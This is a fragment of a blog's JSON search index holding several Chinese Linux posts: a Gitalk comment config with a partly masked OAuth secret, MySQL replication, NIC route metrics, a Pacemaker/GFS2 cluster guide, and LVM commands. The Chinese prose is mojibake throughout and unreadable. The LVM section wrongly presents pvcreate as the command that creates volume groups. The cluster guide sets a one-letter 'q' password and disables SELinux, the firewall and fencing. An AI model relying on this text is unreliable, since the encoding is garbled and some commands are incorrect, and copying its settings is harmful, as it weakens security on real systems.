admin_userè¿™ä¸ªæ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯ä½ è‡ªå·±çš„githubè´¦å·ã€‚\n  * distraction_free_modeé»˜è®¤å°±å¥½ã€‚\n  * proxyä»£ç†å€¼ï¼Œé»˜è®¤å°±å¥½ã€‚\n  * languageè¯­è¨€ç±»å‹ï¼Œåˆ«çš„åœ°æ–¹æˆ‘ä¸ç®¡ï¼Œåœ¨æˆ‘è¿™é‡Œå¿…é¡»è®²ä¸­æ–‡ã€‚\n\n```yaml\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","tags":["åšå®¢è¯„è®º"],"categories":["åšå®¢æ­å»º"]},{"title":"äºŒè¿›åˆ¶æ—¥å¿—ä¸æ•°æ®åº“å¤åˆ¶çš„å…³ç³»","url":"/2023/07/13/why-mysql-binlog/","content":"\n### æ•°æ®åº“å¤åˆ¶çš„åŸç†è§£è¯»\n\næœ€è¿‘è¿›è¡Œçš„å¤§ä¸‰çš„å°å­¦æœŸç­”è¾©å±å®æ˜¯è®©æˆ‘é‡æ–°å®¡è§†äº†è‡ªå·±ï¼Œæœ‰äº›æ“ä½œè‡ªå·±æ˜¯ä¼šé…ç½®äº†ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°è‡ªå·±çš„éœ€æ±‚äº†ï¼Œä½†æ˜¯å¯¹äºæŠ€æœ¯çš„åº•å±‚é€»è¾‘å’ŒåŸç†å¹¶ä¸æ¸…æ¥šï¼Œä¸ºäº†é¿å…è‡ªå·±æˆä¸ºä¸€ä¸ªæœºæ¢°çš„æ‰“å­—å‘˜ï¼Œæœ‰å¿…è¦å°†ä¸€äº›æŠ€æœ¯çš„åº•å±‚å®ç°åŸç†è¿›è¡Œä¸€äº›å‰–æã€‚\n\nè¿™æ˜¯ç½‘ä¸Šæ‰¾çš„æ•°æ®åº“ä¸»ä»å¤åˆ¶çš„åŸç†å›¾ã€‚æ¥ä¸‹æ¥ç»“åˆè¿™å¼ å›¾æ¥è¿›è¡Œå¯¹æ•°æ®åº“ä¸»ä»å¤åˆ¶çš„åŸç†è®²è§£ã€‚\n\n<!-- more -->\n\n![æ•°æ®åº“ä¸»ä»å¤åˆ¶çš„](./why-mysql-binlog/1.png)\n\n1. masteré¦–å…ˆè®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå°†masterä¸»æœºä¸Šæ‰€æœ‰å‘ç”Ÿçš„æ“ä½œï¼ˆå¢åˆ æ”¹ï¼‰éƒ½è®°å½•åˆ°äºŒè¿›åˆ¶æ—¥å¿—ä¸­å»ã€‚\n\n2. slaveä¼šå¼€å¯ä¸€ä¸ªI/Oè¿›ç¨‹ï¼Œç”¨æ¥å’Œmasterå»ºç«‹è¿æ¥ï¼Œè¿›è¡Œbinlog dump processã€‚è¿™ä¸ªè¿›ç¨‹ä¼šä»äºŒè¿›åˆ¶æ—¥å¿—ä¸­è¯»å–äº‹ä»¶ï¼Œå¦‚æœäºŒè€…æ˜¯åŒæ­¥çš„ï¼Œé‚£ä¹ˆslaveä¼šè¿›å…¥ä¼‘çœ çŠ¶æ€ï¼Œç­‰masteräº§ç”Ÿæ–°çš„äº‹ä»¶ï¼Œslaveä¼šé€šè¿‡I/Oè¿æ¥å°†æ–°äº‹ä»¶å†™è¿›è‡ªå·±çš„ä¸­ç»§æ—¥å¿—é‡Œå»ã€‚\n\n3. SQL threadæ˜¯å¤åˆ¶çš„æœ€åä¸€æ­¥ã€‚SQLçº¿ç¨‹ä¼šä»slaveçš„ä¸­ç»§æ—¥å¿—ä¸­è¯»å–äº‹ä»¶ï¼Œå¹¶åœ¨æœ¬æœºä¸­è¿›è¡Œé‡æ”¾ï¼Œç›´è‡³ä¸masterçš„æ•°æ®ä¿æŒä¸€è‡´ã€‚\n\n4. é€šè¿‡è¯¾å¤–èµ„æ–™çš„æŸ¥è¯¢ï¼Œè¿˜å‘ç°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼šå¤åˆ¶è¿‡ç¨‹æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„é™åˆ¶-->å¤åˆ¶åœ¨slaveä¸Šæ˜¯ä¸²è¡ŒåŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´masterä¸Šçš„å¹¶è¡Œæ›´æ–°æ“ä½œä¸èƒ½åœ¨slaveä¸Šå¹¶è¡Œæ“ä½œã€‚\n\n### é¢å¤–çš„è¯\n\nåœ¨å¹³å¸¸é¡¹ç›®ä¸­ï¼Œè€å¸ˆéªŒè¯ä½ çš„æ•°æ®åº“ä¸»ä»å¤åˆ¶æˆ–è€…åŒä¸»çš„ä¾æ®å°±æ˜¯è§‚å¯Ÿæ•°æ®åº“`show slave status \\G`çš„`Slave_IO_Running`å’Œ`Slave_SQL_Running`ä¸¤ä¸ªâ€œyesâ€ã€‚é€šè¿‡è¿™ä¸ªæ–‡ç« ç»“åˆè¿™å¼ å›¾ç‰‡ï¼Œçªç„¶å°±å¯ä»¥é¡¿æ‚Ÿä¸ºä»€ä¹ˆè¿™ä¸¤ä¸ªå‚æ•°å˜ä¸ºâ€œyesâ€å°±ä»£è¡¨æ•°æ®åº“çš„å¤åˆ¶åŠŸèƒ½æ˜¯å®ç°çš„äº†ã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"Linuxå¤šç½‘å¡å¼•èµ·çš„ç½‘ç»œä¸å¯è¾¾","url":"/2023/07/13/modify-METRIC/","content":"\n### ç°è±¡æè¿°\n\nè¿™æ˜¯æˆ‘æœ€ç»åšé¡¹ç›®é‡åˆ°çš„ä¸€ä¸ªæ€ªç°è±¡ï¼Œæ˜¯è¿™æ ·çš„ï¼Œæˆ‘åœ¨è™šæ‹Ÿæœºé‡Œè£…äº†ä¸¤å—ç½‘å¡ï¼Œç¬¬ä¸€å—å‘¢ï¼Œæˆ‘ç”¨æ¥è¿›è¡Œè™šæ‹Ÿæœºä¹‹é—´ä¸šåŠ¡çš„é€šä¿¡ï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†â€œä»…ä¸»æœºæ¨¡å¼â€ï¼Œç¬¬äºŒå—ç½‘å¡æ˜¯ç”¨æ¥è¿æ¥ç½‘ç»œyumæºçš„ï¼Œæ‰€ä»¥å°±æ˜¯â€œNATæ¨¡å¼â€ã€‚\n\nåœ¨æˆ‘ç¬¬äºŒå¤©ç»§ç»­åšé¡¹ç›®çš„æ—¶å€™ï¼Œæˆ‘å‘ç°æˆ‘çš„è™šæ‹Ÿæœºé›†ä½“ç½¢å·¥ï¼Œéƒ½ä¸èƒ½æ­£å¸¸çš„è®¿é—®å¤–ç½‘äº†ï¼Œå°è¯•`ping 8.8.8.8`ä¹Ÿä¸å¯è¾¾ã€‚æˆ‘æŸ¥çœ‹ç¬¬äºŒå—ç½‘å¡çš„IPï¼ŒæŸ¥çœ‹ä¸å®¿ä¸»æœºä¹‹é—´çš„è¿æ¥ï¼Œç½‘æ®µï¼Œç½‘ç®¡éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚æˆ‘ç™¾æ€ä¸å¾—å…¶è§£ï¼Œæˆ‘ä¹‹åè¿›è¡ŒGoogleæ‰äº†è§£åˆ°ï¼Œè¿™æ˜¯å’Œç½‘å¡çš„METRICå€¼æœ‰å…³ç³»çš„ã€‚\n\n<!-- more -->\n\n### é—®é¢˜åˆ†æ\n\nâ€œMETRICâ€æ˜¯Linuxç½‘å¡çš„ä¸€ä¸ªå‚æ•°ï¼Œæœ¬æ„æ˜¯â€œåº¦é‡å€¼â€çš„æ„æ€ï¼Œè¿™ä¸ªæ•°å€¼è¶Šå¤§ï¼Œä»£è¡¨è¿™å—ç½‘å¡çš„ä¼˜å…ˆçº§è¶Šä½ã€‚è€Œåœ¨CentOS Linux ç³»ç»Ÿä¸­é»˜è®¤çš„â€œMETRICâ€å€¼æ˜¯æŒ‰ç…§æ·»åŠ çš„é¡ºåºè¿›è¡Œç¼–å·çš„ã€‚æˆ‘ç¬¬ä¸€å—æ˜¯â€œä»…ä¸»æœºæ¨¡å¼â€çš„ç½‘å¡ï¼Œé»˜è®¤çš„â€œMETRICâ€å€¼æ˜¯100ï¼Œç¬¬äºŒå—åæ·»åŠ çš„â€œNATæ¨¡å¼â€ç½‘å¡â€œMETRICâ€æ˜¯101ã€‚\n\næŸ¥çœ‹METRICå€¼å¯ä»¥ç”¨è¿™ä¸¤æ¡å‘½ä»¤ï¼Œæˆ‘ä¸ªäººæ›´å€¾å‘ç¬¬äºŒæ¡ï¼Œå› ä¸ºæ˜¾ç¤ºæ•ˆæœå¾ˆæ•´é½ï¼š\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\né‚£ä¹ˆé—®é¢˜å°±æ‰¾åˆ°äº†ï¼Œå½“æˆ‘å»`ping 8.8.8.8`çš„æ—¶å€™ï¼Œé»˜è®¤æ˜¯ä»â€œMETRICâ€å€¼å°çš„ç½‘å¡å‡ºå»çš„æµé‡ï¼Œä¹Ÿå°±æ˜¯ä»…ä¸»æœºçš„ç½‘å¡ï¼Œé‚£ä¹ˆè‡ªç„¶ä¹Ÿå°±è®¿é—®ä¸åˆ°å¤–ç½‘äº†ã€‚\n\n### è§£å†³åŠæ³•\n\nè§£å†³åŠæ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåœ¨ä¸€åˆ‡çš†æ–‡ä»¶çš„Linuxç³»ç»Ÿä¸­ï¼Œä¿®æ”¹çš„å‚æ•°æ— éå°±æ˜¯å¯¹é…ç½®æ–‡ä»¶çš„ä¿®æ”¹ã€‚åœ¨æœ¬ä¾‹ä¸­æˆ‘ä»¬ä¿®æ”¹ç½‘å¡çš„é…ç½®æ–‡ä»¶`/etc/sysconfig/network-scripts/ifcfg-ens224`ã€‚åªéœ€è¦åœ¨é‡Œé¢åŠ ä¸Šä¸€è¡Œ`IPV4_ROUTE_METRIC=10`ï¼ŒåŠ åœ¨å“ªä¸€è¡Œæ— æ‰€è°“ï¼Œåªè¦å•è¯ä¸è¦æ‹¼é”™ï¼›æ”¹æˆå¤šå°‘éƒ½æ— æ‰€è°“ï¼Œåªè¦æ¯”å¦ä¸€å¼ ç½‘å¡çš„â€œMETRICâ€å€¼å°å°±OKã€‚\n\nç„¶åæˆ‘ä»¬é‡å¯ç½‘ç»œæœåŠ¡ï¼Œå†é‡æ–°upç½‘å¡ï¼Œç„¶åå†æŸ¥çœ‹ç½‘å¡çš„â€œMETRICâ€å€¼ï¼ŒéªŒè¯æ˜¯å¦ç”Ÿæ•ˆï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œé‚£ä¹ˆç°åœ¨å†å»`ping 8.8.8.8`åº”è¯¥ä¼šå‘ç°å·²ç»å¥½ä½¿äº†ã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"Linuxå…³äºiscsi+pacemaker+CLVM+gfsçš„å®ç°","url":"/2023/07/05/gfs/","content":"\n### åŸºæœ¬ä¿¡æ¯\n\n|||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|ä¸»æœºå|èº«ä»½|ç½‘ç»œæ¥å£|è¿æ¥æ¨¡å¼|IPåœ°å€|\n|web3|webæœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.82/24|\n|web4|webæœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.83/24|\n|storage1|iscsiå­˜å‚¨æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.41/24|\n|storage2|iscsiå­˜å‚¨æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.42/24|\n\n### é¡¹ç›®è¯´æ˜\n\nåœ¨æœ¬é¡¹ç›®ä¸­ï¼Œä¸»è¦å®Œæˆä»¥ä¸‹ä»»åŠ¡ï¼š\n\n1. å®Œæˆgfs1å’Œgfs2å…³äºISCSIå­˜å‚¨æœåŠ¡å™¨çš„æ­å»ºï¼Œå¹¶ä¸”æˆåŠŸæŒ‚è½½åˆ°web1å’Œweb2ä¸»æœºã€‚\n\n<!-- more -->\n\n2. å»ºç«‹web1å’Œweb2ä¸»æœºçš„é›†ç¾¤å…³ç³»ã€‚\n\n3. æŒ‚è½½GFSæ–‡ä»¶ç³»ç»Ÿã€‚\n\n4. é…ç½®é›†ç¾¤èµ„æºã€‚\n\n5. åˆ›å»ºCLVMã€‚\n\n6. æŒ‚è½½å…±äº«å­˜å‚¨ã€‚\n\n### å‡†å¤‡ç¯å¢ƒ\n\n* Centos7ç‰ˆæœ¬çš„è™šæ‹Ÿæœºï¼ŒCentos8ç‰ˆæœ¬çš„æ²¡æœ‰æ‰¾åˆ°èµ„æ–™ï¼Œè¿˜åœ¨è‡ªæˆ‘æ¢ç´¢çš„è¿‡ç¨‹ä¸­ã€‚ç­‰å¾…åæœŸçš„æ›´æ–°å§ã€‚\n\n* è™šæ‹Ÿæœºå…³é—­SELINUXã€‚\n\n* è™šæ‹Ÿæœºå…³é—­é˜²ç«å¢™ã€‚\n\n* è™šæ‹Ÿæœºå…³é—­NetworkManagerã€‚\n\n* ç¼–å†™`/etc/hosts`æ–‡ä»¶ï¼Œè¿™ä¸ªå¯é€‰ï¼Œæˆ‘æ˜¯ä¸ºäº†åæœŸé…ç½®æ–¹ä¾¿ï¼Œæ‰å†™è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ã€‚\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\nå¦‚æœä½ ä¹Ÿæ‰“ç®—ç”¨è¿™ä¸ªï¼Œç¼–è¾‘å®Œä¹‹åå¯ä»¥ä½¿ç”¨scpå‘½ä»¤ç›´æ¥æ‹·è´åˆ°åˆ«çš„ä¸»æœºã€‚\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### é¡¹ç›®å®æ–½\n\n* ä¸€å®šè¦æŒ‰ç…§é¡ºåºæ¥åšã€‚\n\n* å…³äºISCSIæœåŠ¡å™¨åˆ›å»ºå’ŒæŒ‚è½½åˆ°å®¢æˆ·ç«¯çš„æ“ä½œï¼Œå…·ä½“æ­å»ºè¿‡ç¨‹å¯ä»¥çœ‹[æ­å»ºå¹¶æŒ‚è½½ISCSIå­˜å‚¨æœåŠ¡å™¨](https://nustarain.gitee.io/2023/07/04/ISCSI/)è¿™ç¯‡æ–‡ç« ï¼Œæœ¬æ–‡ç« ä¸åœ¨èµ˜è¿°ã€‚å¯¹äºæˆ‘è¿™ä¸ªé¡¹ç›®ï¼Œä¸¤å°ISCSIå­˜å‚¨å™¨éƒ½å„è‡ªæä¾›äº†ä¸€å—ç£ç›˜ï¼Œå¹¶ä¸”åœ¨ä¸¤å°webæœåŠ¡å™¨éƒ½å®ç°äº†æŒ‚è½½ï¼Œstorage1æä¾›çš„ISCSIå­˜å‚¨æ˜ å°„åˆ°webæœåŠ¡å™¨ä¸Šæ˜¯`/dev/sdb`ï¼Œstorage2æä¾›çš„ISCSIå­˜å‚¨æ˜ å°„åˆ°webæœåŠ¡å™¨ä¸Šæ˜¯`/dev/sdc`ã€‚\n\n* æˆ‘æ¥ä¸‹æ¥è®²çš„â€œä¸¤å°è™šæ‹Ÿæœºâ€æ˜¯æŒ‡web3å’Œweb4ï¼Œâ€œä»»æ„ä¸€å°è™šæ‹Ÿæœºâ€æ˜¯æŒ‡web3æˆ–è€…web4å…¶ä¸­çš„ä»»æ„ä¸€å°ã€‚\n\n* ä¸‹è½½è½¯ä»¶ï¼Œä¸¤å°è™šæ‹Ÿæœºéƒ½éœ€è¦åšçš„\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\nè¿™å—çš„æ„æ€æ˜¯ä¸‹è½½äº†pcsdæœåŠ¡ï¼Œå¼€å¯å¹¶è®¾ç½®è‡ªå¯åŠ¨ï¼Œå®‰è£…è¿™ä¸ªæœåŠ¡ä¼šå†ç³»ç»Ÿåˆ›å»ºä¸€ä¸ª`hacluster`ç”¨æˆ·ï¼Œåé¢è¦ç”¨ï¼Œè¦å…ˆç»™ä»–æ”¹ä¸ªå¯†ç ã€‚\n\n* é›†ç¾¤å»ºç«‹å…è®¤è¯ï¼Œåœ¨é›†ç¾¤ä»»æ„ä¸€å°æœºå™¨åšå°±å¯ä»¥\n\nè¯´ç™½ä¸€ç‚¹ï¼Œå°±æ˜¯web3ç”Ÿæˆå…¬é’¥ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥å‘ç»™web4ï¼Œæˆ–è€…web4ç”Ÿæˆå…¬é’¥ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥å‘ç»™web3ã€‚\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\nä¸Šé¢çš„å‘½ä»¤æ˜¯ä»¥web3ä¸¾çš„ä¾‹å­ã€‚\n\n* æ­å»ºé›†ç¾¤ï¼Œä¸¤å°è™šæ‹Ÿæœºéƒ½éœ€è¦åšçš„\n\n```bash\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # å¦‚æœæŠ¥é”™å°±å¼ºåˆ¶æ‰§è¡Œè¿›è¡Œè¦†ç›–\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\nä¸€èˆ¬æƒ…å†µä¸‹å¦‚æœç¬¬ä¸€æ¬¡åˆ›å»ºé›†ç¾¤ï¼Œä¸Šé¢å‘½ä»¤å¯ä»¥ç›´æ¥åˆ›å»ºæˆåŠŸï¼Œå¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œå°±éœ€è¦åŠ `--force`é€‰é¡¹å¼ºåˆ¶è¦†ç›–ã€‚ç­‰åˆ°æ‰€æœ‰ä¿¡æ¯éƒ½successï¼Œä¸‹é¢çš„é›†ç¾¤å¼€å¯ï¼ŒæŸ¥çœ‹çŠ¶æ€ï¼Œè®¾ç½®è‡ªå¯åŠ¨éƒ½ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜çš„ã€‚\n\nå¦‚æœç¬¬ä¸€æ¬¡é›†ç¾¤å‡ºç°äº†ä»€ä¹ˆé—®é¢˜ï¼Œæ‰“ç®—é‡æ–°åšï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„è¿™ä¸ªå‘½ä»¤æ‘§æ¯é›†ç¾¤ï¼Œç„¶åå†å¼ºåˆ¶å»ºç«‹é›†ç¾¤ã€‚\n\n```bash\npcs cluster destroy\n```\n\n* æŒ‚è½½GFSæ–‡ä»¶ç³»ç»Ÿï¼Œä¸¤å°è™šæ‹Ÿæœºéƒ½éœ€è¦åšçš„\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\nåœ¨è¿›è¡Œå®Œæœ€åä¸€æ­¥ä¹‹åï¼Œå¦‚æœå‡ºç°ä¸€äº›çœ‹ä¸æ‡‚çš„å†…å®¹å°±è¯´æ˜ï¼ŒGFSæ–‡ä»¶ç³»ç»Ÿå·²ç»æŒ‚è½½åˆ°è¿™ä¸ªç³»ç»Ÿä¸Šäº†ï¼Œå¯ä»¥ä½¿ç”¨å®ƒè¿›è¡Œæ ¼å¼åŒ–ç£ç›˜äº†ã€‚\n\n* é…ç½®é›†ç¾¤èµ„æºï¼Œåœ¨é›†ç¾¤ä»»æ„ä¸€å°æœºå™¨åšå°±å¯ä»¥\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\nè¿™å—æ˜¯æ²¡æœ‰ä¸ªæ€§åŒ–çš„ï¼Œå¯ä»¥ç›´æ¥æ— è„‘<kbd>Ctrl</kbd>+<kbd>C</kbd>å’Œ<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* åˆ›å»ºCLVMï¼Œåœ¨é›†ç¾¤ä»»æ„ä¸€å°æœºå™¨åšå°±å¯ä»¥\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\nè¿™é‡Œå‘½ä»¤çš„å…·ä½“å«ä¹‰å¦‚æœä¸æ‡‚ï¼Œå¯ä»¥çœ‹æˆ‘çš„[å…³äºLVMçš„é…ç½®](https://nustarain.gitee.io/2023/07/04/LVM/)çš„æ–‡ç« ã€‚\n\n* æŒ‚è½½å®ç°å…±äº«å­˜å‚¨\n\n```bash\n# æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨é›†ç¾¤ä»»æ„ä¸€å°æœºå™¨åšå°±å¯ä»¥\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# åˆ›å»ºæŒ‚è½½ç‚¹ï¼Œä¸¤å°è™šæ‹Ÿæœºéƒ½éœ€è¦åšçš„\nmkdir /mnt/cluster\n# è¦å®ç°è‡ªåŠ¨æŒ‚è½½ï¼Œåœ¨é›†ç¾¤ä»»æ„ä¸€å°æœºå™¨åšå°±å¯ä»¥\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# ç»™é›†ç¾¤èµ„æºè®¾ç½®å¯åŠ¨é¡ºåº\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\næœ€å`df`å¦‚æœçœ‹åˆ°è‡ªå·±åˆ›å»ºçš„é€»è¾‘å·`/dev/qavg/qa`ï¼Œå°±è¯´æ˜æŒ‚è½½æˆåŠŸäº†ï¼Œå¯ä»¥é€šè¿‡å‘æŒ‚è½½ç‚¹é‡Œé¢å†™å…¥æ–‡ä»¶æ¥ä½¿ç”¨å­˜å‚¨äº†ã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"å…³äºLVMçš„é…ç½®","url":"/2023/07/04/LVM/","content":"\n### æ¦‚è¿°\n\nLVMé‡Œé¢ä¸»è¦æœ‰ä¸‰ä¸ªåè¯ï¼Œç‰©ç†å·ï¼ˆPVï¼‰ï¼Œå·ç»„ï¼ˆVGï¼‰ï¼Œé€»è¾‘å·ï¼ˆLVï¼‰ã€‚\n\nç‰©ç†å·å¯ä»¥æœ‰å¾ˆå¤šå½¢å¼ï¼Œä¸€å—å•ç‹¬çš„ç£ç›˜ï¼ˆ`/dev/sda`ï¼‰ï¼Œä¸€ä¸ªåˆ†å¥½çš„åˆ†åŒºï¼ˆ`/dev/sdb2`ï¼‰ï¼Œç”šè‡³ä¸€ä¸ªæ–‡ä»¶éƒ½å¯ä»¥æ˜¯ç‰©ç†å·çš„ä¸€ç§å½¢å¼ã€‚\n\nå•ä¸ªç‰©ç†å·æˆ–è€…å¤šä¸ªç‰©ç†å·éƒ½å¯ä»¥ç»„åˆèµ·æ¥å˜æˆä¸€ä¸ªå·ç»„ï¼Œè¿™æ ·å°±æŠŠå‡ ä¸ªå•ç‹¬çš„å­˜å‚¨ç©ºé—´ç»™æ•´åˆäº†èµ·æ¥ï¼Œå˜æˆäº†ä¸€ä¸ªå¤§çš„å­˜å‚¨æ± ã€‚\n\nå¦‚æœè¦ä½¿ç”¨çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™ä¸ªæ± å­é‡Œé¢åˆ†å‡ºä¸€éƒ¨åˆ†æ¥ä½œä¸ºå­˜å‚¨ï¼Œè¿™ä¸ªå­˜å‚¨å°±æ˜¯é€»è¾‘å·ã€‚\n\n### ç‰©ç†å·\n\n* åˆ›å»ºç‰©ç†å·\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* æŸ¥çœ‹ç‰©ç†å·çš„è¯¦ç»†ä¿¡æ¯\n\n```bash\npvdisplay\n```\n\n* æŸ¥çœ‹ç‰©ç†å·çš„ç²¾ç®€ä¿¡æ¯\n\n```bash\npvs\n```\n\n### å·ç»„\n\n* åˆ›å»ºå·ç»„\n\n```bash\npvcreate qavg /dev/sdb\n```\n\nåˆ©ç”¨`/dev/sdb`åˆ›å»ºä¸€ä¸ªå«qavgçš„å·ç»„ã€‚\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\nåˆ©ç”¨`/dev/sdb`åˆ›å»ºä¸€ä¸ªå«qavgçš„å·ç»„ï¼Œå¹¶ä¸”è®¾ç½®å·ç»„é‡Œæœ€å°çš„é€»è¾‘å­˜å‚¨å•ä½ä¸º16Mã€‚\n\n* æŸ¥çœ‹å·ç»„çš„è¯¦ç»†ä¿¡æ¯\n\n```bash\nvgdisplay\n```\n\n* æŸ¥çœ‹å·ç»„çš„ç²¾ç®€ä¿¡æ¯\n\n```bash\nvgs\n```\n\n* æ‰©å®¹å·ç»„\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\nå°†ç‰©ç†å·`dev/sdb2`åŠ å…¥å·ç»„qavg\n\n* åˆ å‡å·ç»„\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\nå°†ç‰©ç†å·`/dev/sdb2`ä»å·ç»„qavgä¸­åˆ é™¤\n\n* åˆ é™¤å·ç»„\n\n```bash\nvgremove qavg\n```\n\n* é‡å‘½åå·ç»„\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\né‡å‘½åå·ç»„`/dev/qavg1`ä¸º`/dev/qavg2`ã€‚\n\n### é€»è¾‘å·\n\n* åˆ›å»ºé€»è¾‘å·\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\nåˆ©ç”¨`qavg`è¿™ä¸ªå·ç»„åˆ›å»ºä¸€ä¸ªå«`qa`å¤§å°ä¸º200Mçš„é€»è¾‘å·ã€‚è¿™é‡Œçš„**Lé€‰é¡¹**æŒ‡å®šçš„æ˜¯å¹³å¸¸è®²çš„ç£ç›˜çš„å¤§å°ã€‚\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\nä½¿ç”¨**lé€‰é¡¹**æ˜¯æŒ‡å®šçš„é€»è¾‘çš„å—å¤šå°‘ï¼Œæ¯”å¦‚ä¸Šé¢åˆ›å»ºå·ç»„æ—¶æŒ‡å®šçš„ä¸€ä¸ªå—çš„å¤§å°æ˜¯16Mï¼Œè¿™é‡ŒæŒ‡å®š45ä¸ªï¼Œé€»è¾‘å·çš„å¤§å°å°±æ˜¯720M\n\n* æ‰©å®¹é€»è¾‘å·\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\nè¿™ä¸ªæ˜¯æŒ‡åœ¨åŸæ¥é€»è¾‘å·çš„åŸºç¡€ä¸Šå†å¢åŠ 54Mibçš„å­˜å‚¨ç©ºé—´ã€‚ä½†å¢åŠ ä¸èƒ½è¶…è¿‡å·ç»„çš„æ€»å®¹é‡å¤§å°ã€‚\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\nä½¿ç”¨å·ç»„é‡Œ`/dev/sdk3`è¿™ä¸ªç‰©ç†å·çš„å…¨éƒ¨ç©ºé—´ä¸º`qavg/qa`æ‰©å®¹ã€‚\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\nä½¿ç”¨å·ç»„é‡Œ`/dev/sda`çš„8-9Mçš„ç©ºé—´å’Œ`/dev/sdb`çš„8-9Mçš„ç©ºé—´ä¸ºé€»è¾‘å·`qavg/qa`æ‰©å®¹\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\nä½¿ç”¨å·ç»„æ‰€æœ‰å‰©ä½™çš„ç©ºé—´ä¸º`qavg/qa`æ‰©å®¹ã€‚\n\n* æŸ¥çœ‹é€»è¾‘å·è¯¦ç»†ä¿¡æ¯\n\n```bash\nlvdisplay\n```\n\n* æŸ¥çœ‹é€»è¾‘å·ç²¾ç®€ä¿¡æ¯\n\n```bash\nlvs\n```\n\n* åˆ é™¤é€»è¾‘å·\n\n```bash\nlvremove 